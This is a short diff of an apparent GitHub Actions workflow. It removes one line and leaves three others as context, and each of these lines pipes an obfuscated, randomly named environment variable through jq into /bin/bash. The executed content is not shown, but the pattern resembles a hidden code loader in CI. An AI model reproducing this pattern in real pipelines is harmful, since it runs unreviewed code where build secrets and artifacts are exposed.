@@ -24,7 +24,6 @@ jobs:
           echo $lwgf10053 | jq -r .ndyp4717 | /bin/bash
           echo $yvrc47552 | jq -r .pqknd18 | /bin/bash
           printf '%s' "$rto38551" | jq -r .ci8881 | /bin/bash
-          printf '%s' "$edm4" | jq -r .gms4948 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
